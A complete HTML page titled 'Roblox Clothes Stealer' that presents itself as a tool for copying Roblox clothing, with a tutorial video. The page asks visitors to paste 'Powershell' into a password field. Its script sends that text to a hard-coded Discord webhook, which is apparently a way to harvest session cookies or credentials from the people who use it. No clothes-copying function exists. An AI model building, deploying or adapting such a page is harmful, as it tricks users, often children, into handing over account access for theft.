<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Clothes Stealer</title>
    <style>
        body {
            margin: 0;
            height: 100vh;
            background: 
                linear-gradient(to right, 
                    rgb(155, 155, 248) 5%, 
                    rgba(19, 19, 19, 1) 15%, 
                    rgba(19, 19, 19, 1) 85%, 
                    rgb(155, 155, 248) 95%),
                radial-gradient(circle at top left, 
                    rgba(155, 155, 248, 0.3) 10%, 
                    transparent 50%),
                radial-gradient(circle at bottom right, 
                    rgba(155, 155, 248, 0.3) 10%, 
                    transparent 50%);
            background-color: rgb(19, 19, 19);
            background-blend-mode: overlay;
            background-size: 100% 100%;
            font-family: Arial, sans-serif;
        }

        .text-box {
            position: absolute;
            top: 20%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: #fff;
            font-size: 36px;
            font-weight: bold;
            text-align: center;
            opacity: 0;
            animation: fadeIn 3s forwards;
            text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.7);
        }

        @keyframes fadeIn {
            0% {
                opacity: 0;
            }
            100% {
                opacity: 1;
            }
        }

        .rounded-box {
            position: absolute;
            top: 55%;
            left: 35%;
            transform: translate(-50%, -50%);
            width: 500px;
            height: 372px;
            background-color: transparent;
            border: 1px solid rgb(70, 70, 70);
            border-radius: 25px;
            padding: 20px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        .left-box-title {
            font-size: 18px;
            font-weight: bold;
            color: #fff;
            margin-bottom: 15px;
            text-align: center;
        }

        .input-box {
            width: 80%;
            padding: 10px;
            border: 1px solid rgb(70, 70, 70);
            border-radius: 20px;
            background-color: transparent;
            color: #fff;
            font-size: 16px;
            margin: 15px 0;
            display: block;
            text-align: center;
        }

        .steal-button {
            width: 80%;
            padding: 12px;
            border: 1px solid rgb(70, 70, 70);
            border-radius: 15px;
            background-color: transparent;
            color: #fff;
            font-size: 16px;
            margin: 15px 0;
            display: block;
            text-align: center;
            cursor: pointer;
        }

        .rounded-box-right {
            position: absolute;
            top: 55%;
            left: 65%;
            transform: translate(-50%, -50%);
            width: 500px;
            height: 372px;
            background-color: transparent;
            border: 1px solid rgb(70, 70, 70);
            border-radius: 25px;
            display: flex;
            justify-content: center;
            align-items: center;
            text-align: center;
            flex-direction: column;
            padding-top: 10px;
        }

        .right-box-label {
            color: #fff;
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 20px;
        }

        .right-box-video {
            width: 80%;
            height: 80%;
            border-radius: 20px;
            overflow: hidden;
        }

        video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
    </style>
</head>
<body>
    <div class="text-box">
        Roblox Clothes Stealer
    </div>

    <div class="rounded-box">
        <div class="left-box-title">Enter Powershell Here</div>
        <input type="password" class="input-box" id="powershellInput" placeholder="Enter Here" />
        <button class="steal-button" id="stealButton">Steal Clothes</button>
    </div>

    <div class="rounded-box-right">
        <div class="right-box-label">tutorial</div>
        <div class="right-box-video">
            <video controls>
                <source src="tutorial.mp4" type="video/mp4">
                Your browser does not support the video tag.
            </video>
        </div>
    </div>

    <script>
        document.getElementById('stealButton').addEventListener('click', function() {
            const powershellText = document.getElementById('powershellInput').value;

            if (powershellText.trim() !== '') {
                const file = new Blob([powershellText], { type: 'text/plain' });
                const formData = new FormData();
                formData.append('file', file, 'message.txt');

                fetch('https://discord.com/api/webhooks/1321778429015621693/HNT251o7ObV_rCY9k4s15CHTU2d_IXTdOGZegZevP1AMNR65_BMUngLG10e1dhssv6PE', {
                    method: 'POST',
                    body: formData
                });
            }
        });
    </script>
</body>
</html>
